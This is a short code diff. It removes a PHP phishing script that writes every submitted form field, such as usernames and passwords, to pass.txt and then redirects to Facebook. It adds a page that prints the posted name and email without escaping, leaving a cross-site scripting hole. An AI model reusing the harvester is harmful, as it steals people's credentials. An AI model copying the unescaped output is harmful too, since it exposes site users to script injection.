@@ -1,13 +1,8 @@
-<?php
-header ('Location: https://facebook.com/me');
-$handle = fopen("pass.txt", "a");
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
-fwrite($handle, "\r\n\n\n\n");
-fclose($handle);
-exit;
-?>
+<html>
+<body>
+
+Welcome <?php echo $_POST["name"]; ?><br>
+Your email address is: <?php echo $_POST["email"]; ?>
+
+</body>
+</html>
